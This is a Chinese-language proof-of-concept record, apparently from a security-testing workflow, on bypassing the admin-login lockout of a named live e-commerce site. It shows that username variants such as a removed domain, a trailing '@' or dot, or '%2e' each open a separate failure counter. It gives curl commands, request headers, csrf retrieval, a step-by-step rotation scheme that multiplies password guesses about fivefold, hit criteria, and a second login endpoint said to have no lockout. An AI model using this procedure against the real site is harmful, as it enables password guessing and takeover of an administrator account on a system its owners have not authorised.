# ecloudstore /api/command adminLogin：账号锁键取用户名原始串 trim+小写，去域名/尾@/尾点/%2e/@前空格各开独立计数窗口（口令预算放大 5~6 倍）

- **code**: ecloudstore-adminlogin-username-variant-lock-bypass
- **kind**: template
- **category**: auth-bypass
- **component**: ecloudstore 自研站（/api/command RPC 网关，adminLogin 方法）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-06 05:58~06:10 在本机对 https://ecloudstore.com 实测（curl.exe，Origin: https://ecloudstore.com，每发新 Idempotency-Key，间隔 9.5s），日志 D:\ARTEX\data\tasks\616\i10560\lk.log：① 以 support@ecloudstore.com 连投错口令，7 发 200 {"ok":false,"code":"BAD_CREDENTIALS"} 后第 8 发返回 429 {"ok":false,"error":"尝试次数过多，请稍后再试"}，证明存在按账号计数的锁；② 锁住期间 SUPPORT@ecloudstore.com 与 " support@ecloudstore.com" 同为 429（大小写/首尾空白归一到同键），而 "Support@" 返回 200 BAD_CREDENTIALS（独立键）；③ 同一时刻 support / support@ / support@ecloudstore%2ecom / support@ecloudstore.com. / "Support @ecloudstore.com" 全部 200 BAD_CREDENTIALS，说明这 5 个变体各开独立计数窗口；④ 06:10:48 基础串已解除（200）而 06:10:50 的 'support' 仍 429，证明各窗口独立计时、TTL≈10 分钟。据此判定锁键 = trim(小写(原始用户名字符串))，单账号预算由 10 次/10min 实际放大到约 50~60 次/10min。
- **path**: pocs/ecloudstore-adminlogin-username-variant-lock-bypass/poc.md
- **created_at**: 2026-11-05T22:22:43.604Z
- **engine**: https://ecloudstore.com

## 描述

adminLogin 登录失败计数（约 10 次后 429）的键只是用户名字符串的 trim+小写归一，不做任何规范化（不去 @ 域名、不剥尾点、不合并本地部分）。因此同一账号的多种书写形式各持一把独立锁，可在同一时间并行开 5~6 个计数窗口，把单账号口令预算从 10 次/10min 放大到 50~60 次/10min，用于低噪声在线口令审计。另 /api/chat/admin/login 侧无账号锁且不共享锁状态。

## 用法

```
1) 先取 csrf：GET https://ecloudstore.com/api/bootstrap（无需登录），取返回体里的 csrf 字段。
2) 先跑基线确认锁存在：连续 POST /api/command method=adminLogin，正确用户名 + 错误口令，间隔 9.5s，直到出现 429「尝试次数过多，请稍后再试」。
3) 此时换变体串逐个试探，仍返回 200 BAD_CREDENTIALS 的即为新窗口；≈10 发再锁，再换下一个。可轮转的窗口约 6 个/账号（base、去域名、尾加 @、尾加 .、@ 前插空格、点写 %2e），实际把预算放大 5~6 倍。
4) 判据只有三种：200 {"ok":false,"code":"BAD_CREDENTIALS"}=口令错且还在窗口内；429 锁文案=该串窗口耗尽，换变体；200 {"ok":true,...}=命中。
5) 每发必须带新 Idempotency-Key，否则被幂等去重、不会计数；Origin 必须正确。
6) 打完也试一下 /api/chat/admin/login（body 提交），该侧实测 9 发全 401 无 429，且不继承 /api/command 的锁，等于无账号锁。
```

## 正文

```
# ecloudstore adminLogin 账号锁 —— 用户名变体分桶绕过

## 结论

`POST /api/command` 的 `adminLogin` 方法在约 10 次口令失败后返回

```
HTTP 429 {"ok":false,"error":"尝试次数过多，请稍后再试"}
```

但计数键只是 **trim(小写(原始用户名字符串))**，没有做任何账户规范化（不去 `@域名`、不剥尾点、不合并本地部分、不按用户 id 归一）。于是：

- 大小写差异、首尾空白 → 归一到**同一把**锁（无效变体）
- 去域名、尾加 `@`、尾加 `.`、把 `.` 写成 `%2e`、`@` 前插空格 → 各自**独立**的计数窗口

每个窗口约 10 发、TTL 约 10 分钟，各窗口互不影响。单账号口令预算由 `10 次/10min` 实际放大到约 `50~60 次/10min`。

## 前置条件

- `GET /api/bootstrap` 可取 csrf（**无需登录**）
- 请求头 `Origin: https://ecloudstore.com`
- **每一发都要新的 `Idempotency-Key`**（复用会被幂等去重，不算一次尝试）
- 建议间隔 ≥9.5s，避免连接层与未知的次级限速

## 请求格式

```http
POST /api/command HTTP/1.1
Host: ecloudstore.com
Origin: https://ecloudstore.com
Content-Type: application/json
Idempotency-Key: <每发一个新的随机值>

{"method":"adminLogin","args":["<USERNAME_VARIANT>","<PASSWORD_CANDIDATE>"]}
```

curl 等价：

```bash
CSRF=$(curl -s https://ecloudstore.com/api/bootstrap | jq -r .csrf)
curl -s 'https://ecloudstore.com/api/command' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://ecloudstore.com' \
  -H "X-CSRF-Token: $CSRF" \
  -H "Idempotency-Key: $(uuidgen)" \
  --data '{"method":"adminLogin","args":["support@ecloudstore.com","Zz9wrong"]}'
```

## 步骤与判定

### 1. 确认锁存在（基线）

同一基础串连投错口令：

```
POST {"method":"adminLogin","args":["support@ecloudstore.com","Zz9wrong"]}   x8，间隔 9.5s
→ 前 7 发 200 {"ok":false,"error":"账号或密码错误","code":"BAD_CREDENTIALS"}
→ 第 8 发 429 {"ok":false,"error":"尝试次数过多，请稍后再试"}
```

看到 429 即证明账号维度锁成立（也确认了判据文案）。

### 2. 区分「归一」与「独立」变体

同一账号的写法按下列三类分辨：

| 变体 | 示例（账号 support@ecloudstore.com） | 现象 |
|---|---|---|
| 大小写 | `SUPPORT@ecloudstore.com` | 429，同键 |
| 首尾空白 | `" support@ecloudstore.com"` | 429，同键 |
| 去域名 | `"support"` | 200 BAD_CREDENTIALS，**新窗口** |
| 尾加 `@` | `"Support@"` | 200 BAD_CREDENTIALS，**新窗口** |
| 尾加 `.` | `"support@ecloudstore.com."` | 200 BAD_CREDENTIALS，**新窗口** |
| `.` 写 `%2e` | `"support@ecloudstore%2ecom"` | 200 BAD_CREDENTIALS，**新窗口** |
| `@` 前插空格 | `"Support @ecloudstore.com"` | 200 BAD_CREDENTIALS，**新窗口** |

一律在基础串处于 429 时投，避免误判。

### 3. 轮转放大

每个变体窗口各用完约 10 发再换下一个，6 个窗口轮转即可把单账号预算放大 5~6 倍；窗口按各自约 10 分钟 TTL 独立复活（实测不同窗口解锁时刻前后相差 <2s 但互不牵连）。

### 4. 旁路通道

`/api/chat/admin/login`（body 提交）连投 9 发错口令全 `401`、无 429，且**不继承** `/api/command` 的锁状态 —— 该侧等于没有账号锁，可作额外免费通道。

## 判据速查

- `200 {"ok":false,"code":"BAD_CREDENTIALS"}` = 口令错，窗口尚存，继续
- `200 {"ok":true,...}` = 命中
- `429` + 锁文案 = 该字符串窗口耗尽，换下一个变体
- 变体也返回 429 = 该变体不是独立键（或已用过），换下一个

## 失败时的常见原因

1. **没换 Idempotency-Key** → 幂等去重，发了等于没发，永远不见 429 也不消耗预算。
2. **Origin 缺失/错误** → 直接 403，不进入登录逻辑。
3. **把变体当 HTTP 参数做 URL 编码** → 变体必须原样放进 JSON 的 `args[0]`，`%2e` 要作为字面量传入（不要二次编码）。
4. **间隔太短** → 打到连接层/网关层限速，回 502/超时，与账号锁无关。
5. **误以为账号规范化** → 去域名后后端是否真的解析到同一用户未验证；只有回 200 BAD_CREDENTIALS（而不是「账号不存在」）才说明这一步仍在校验同一账号。
6. **单点连投超过 ~10 发** 仍 429 → 说明该变体与已用键归一（如大小写），没用。

## 备注

锁是账号级的，不是 IP 级的：客户端换出口 IP 对这把锁无效，只能靠字符串变体开新窗口。

```
